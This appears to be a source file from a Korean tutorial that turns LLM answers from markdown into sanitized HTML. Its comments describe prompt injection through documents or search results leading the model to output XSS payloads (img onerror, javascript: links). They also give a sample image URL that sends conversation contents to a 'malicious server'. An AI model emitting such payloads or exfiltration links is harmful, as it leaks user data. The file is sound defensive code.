// LLM의 답을 마크다운에서 HTML로 바꾼다.
// LLM의 답은 "남이 쓴 글"이다. 문서나 웹 검색 결과에 섞인 지시(9장의 프롬프트 주입)를 따라
// <img onerror=...>나 javascript: 링크를 내놓을 수 있다. 그래서 바꾼 HTML은 반드시 정화(sanitize)한다
import DOMPurify from 'dompurify';
import { marked } from 'marked';

const escapeHtml = (s: string) =>
  s.replace(/[&<>"']/g, (c) => `&#${c.charCodeAt(0)};`);

marked.use({
  gfm: true,
  breaks: true,
  renderer: {
    // 이미지는 불러오지 않고 글자로만 보여 준다.
    // ![](https://악성서버/?q=대화내용) 같은 주소를 불러오는 것만으로 대화 내용이 밖으로 나갈 수 있다
    image({ text }) {
      return `<span class="img-alt">[이미지: ${escapeHtml(text)}]</span>`;
    },
  },
});

// 링크는 새 창 요청(target=_blank)으로 만든다.
// Main의 setWindowOpenHandler가 https 링크만 OS 기본 브라우저로 열고 나머지는 막는다 (7장)
DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (node.tagName === 'A') {
    node.setAttribute('target', '_blank');
    node.setAttribute('rel', 'noopener noreferrer');
  }
});

export function renderMarkdown(text: string): string {
  const html = marked.parse(text, { async: false });
  return DOMPurify.sanitize(html, {
    FORBID_TAGS: ['img', 'style', 'form', 'input', 'button', 'iframe'],
  });
}
